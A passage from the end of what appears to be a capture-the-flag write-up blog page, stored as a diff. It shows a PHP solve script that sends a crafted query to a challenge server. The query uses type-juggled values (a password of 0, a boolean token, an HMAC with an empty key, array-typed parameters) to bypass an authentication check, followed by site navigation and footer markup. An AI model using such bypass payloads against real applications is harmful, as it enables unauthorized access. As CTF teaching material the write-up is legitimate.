+<span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+
+$url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://mirror/&#34;</span>;
+
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">post_request</span>($url, $data) {
+    <span style="color:#a6e22e">var_dump</span>($data);
+    <span style="color:#75715e">/*$options = array(
+</span><span style="color:#75715e">        &#39;http&#39; =&gt; array(
+</span><span style="color:#75715e">            &#39;proxy&#39;   =&gt; &#39;tcp://127.0.0.1:8080&#39;,
+</span><span style="color:#75715e">            &#39;request_fulluri&#39; =&gt; true,
+</span><span style="color:#75715e">        )
+</span><span style="color:#75715e">    );
+</span><span style="color:#75715e">    $context = stream_context_create($options);*/</span>
+    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">file_get_contents</span>($url <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;?&#34;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">http_build_query</span>($data), <span style="color:#66d9ef">false</span>);<span style="color:#75715e">//), $context);
+</span><span style="color:#75715e"></span>}
+
+$obj <span style="color:#f92672">=</span> <span style="color:#a6e22e">serialize</span>(<span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;user&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">true</span>, <span style="color:#e6db74">&#39;pass&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">true</span>));
+
+$data <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(
+    <span style="color:#e6db74">&#39;pass&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#a6e22e">json_encode</span>(
+        <span style="color:#66d9ef">array</span>(
+            <span style="color:#e6db74">&#39;pass&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">0</span>,
+            <span style="color:#e6db74">&#39;token&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">true</span>,
+            <span style="color:#e6db74">&#39;check&#39;</span> <span style="color:#f92672">=&gt;</span> $obj,
+            <span style="color:#e6db74">&#39;hash&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#a6e22e">hash_hmac</span>(<span style="color:#e6db74">&#39;ripemd160&#39;</span>, $obj, <span style="color:#e6db74">&#39;&#39;</span>)
+        )
+    ), 
+    <span style="color:#e6db74">&#39;key[]&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;&#39;</span>,
+    <span style="color:#e6db74">&#39;something[]&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;&#39;</span>
+);
+
+$result <span style="color:#f92672">=</span> <span style="color:#a6e22e">post_request</span>($url, $data);
+<span style="color:#a6e22e">var_dump</span>($result);
+
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div>
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h">Read other posts</span>
+            <hr/>
+          </div>
+          <div class="pagination__buttons">
+            
+              <span class="button previous">
+                <a href="https://jorgectf.gitlab.io/blog/post/intigriti-10-2021/">
+                  <span class="button__icon">←</span>
+                  <span class="button__text">Intigriti&#39;s October 2021 XSS challenge writeup</span>
+                </a>
+              </span>
+            
+            
+              <span class="button next">
+                <a href="https://jorgectf.gitlab.io/blog/post/aeroctf-2021-not-received-points/">
+                  <span class="button__text">AeroCTF 2021&#39;s Not received points solution</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
+      
+    
+
+    
+      
+        
+
+<script src="https://unpkg.com/shiki"></script>
+
+<script>
+    if (document.querySelector("code[data-lang*='ql']")) {
+        shiki
+            .getHighlighter({
+                theme: 'github-dark',
+                langs: [
+                    {
+                        id: 'codeql',
+                        scopeName: 'source.ql',
+                        path: '/languages/codeql.tmLanguage.json',
+                        samplePath: 'codeql.sample',
+                        aliases: ['ql']
+                    }
+                ]
+            })
+            .then(highlighter => {
+                for (codeElement of document.querySelectorAll("code[data-lang]")) {
+                    try {
+                        let prev = codeElement.textContent
+                        let code = highlighter.codeToHtml(prev, { lang: codeElement.dataset.lang.toString() })
+                        codeElement.parentNode.innerHTML = code
+                    } catch(err) {
+                        console.log(err)
+                    }
+                }
+                for (shikiElement of document.querySelectorAll("pre[class='shiki']")) {
+                    shikiElement.parentNode.parentNode.replaceChild(
+                        shikiElement, shikiElement.parentNode
+                    )
+                }
+            })
+    }
+</script>
+      
+    
+  </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <a href="https://jorgectf.gitlab.io/blog/" class="logo" style="text-decoration: none;">
+  
+  <img src="https://jorgectf.gitlab.io/blog/logo.png" alt="jorgectf"/>
+  
+</a>
+      <div class="copyright">
+        <span>© 2021 Powered by
+          <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span>
+        <span>Theme created by
+          <a href="https://twitter.com/panr" target="_blank" rel="noopener">panr</a></span>
+      </div>
+    
+  </div>
+</footer>
+
+<script src="https://jorgectf.gitlab.io/blog/assets/main.js"></script>
+
+
+      
+    </div>
+
+    
+  
+
+</body></html>
